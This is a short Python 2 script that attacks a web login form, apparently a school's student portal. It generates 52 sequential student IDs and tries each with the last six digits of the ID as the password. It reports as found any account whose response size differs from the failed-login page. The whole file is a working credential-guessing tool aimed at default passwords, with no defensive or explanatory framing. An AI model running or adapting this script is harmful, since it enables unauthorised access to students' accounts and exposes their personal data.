import random
import sys
import urllib
import urllib2

def getWrongCode():
    url = sys.argv[1]
    values = {'userName': 1, 'userPass': 1, 'Submit': '%B5%C7+%C2%BC'}
    data = urllib.urlencode(values)
    response = urllib2.urlopen(url, data)
    html = response.read()
    print html.__sizeof__()
    f = open('huaqiao.txt', 'w')
    f.write(html)
    f.close()

# generate a list of containing student-ID
def student_number_generator():
    c = []
    for i in range(52):
        a = 320815303001 + i
        c.append( str(a) )
    return c

def main():
    url = sys.argv[1]
    c = student_number_generator() 
    for i in range(52):
        values = {'userName': c[i], 'userPass': c[i][-6:], 'Submit': '%B5%C7+%C2%BC'}
        data = urllib.urlencode(values)
        response = urllib2.urlopen(url, data)
        html = response.read()
        if html.__sizeof__() != 203:
            print 'User Found ' + str(values['userName']) + ':' + str(values['userPass'])

if __name__ == "__main__":
    main()
